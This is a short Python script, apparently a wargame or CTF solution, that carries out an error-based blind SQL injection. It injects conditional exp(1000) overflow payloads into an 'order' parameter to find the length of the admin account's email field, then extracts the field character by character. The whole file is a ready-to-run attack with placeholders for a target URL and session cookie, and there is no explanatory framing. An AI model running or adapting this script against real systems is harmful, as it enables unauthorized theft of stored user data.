import requests
import urllib
import urllib3

pw = ""
length = 0

url = "YOUR_URL"
session = dict(PHPSESSID = "YOUR_SESSION_ID")

# find length
print("[*] Finding Length...")

for i in range(0, 100):
    try:
        query = url + "?order=1 and id='admin' and if((length(email)=" 
        query = query + str(i) + "),exp(1000),1)"
        r = requests.post(query, cookies=session)
    except:
        print ("[-] An error occurred, shutting down...")
        exit()

    if not "rubiya" in r.text:
        length = i
        break

print("[+] Length found: ", length)

# find password
print("[*] Finding Password... (Brute-forcing may take awhile)")

for i in range(0, length + 1):
    for j in range(48, 128): #ASCII
        try:
            query = url + "?order=1 and id='admin' and if((ascii(substr(email,"
            query = query + str(i) + ",1))=" + str(j) + "),exp(1000),1)"
            r = requests.post(query, cookies=session)
        except:
            print ("[-] An error occurred, shutting down...")
            exit()
        if not "rubiya" in r.text:
            pw = pw + chr(j)
            print("[+] ", pw)
            break
        	
print("[+] Password found: ", pw)
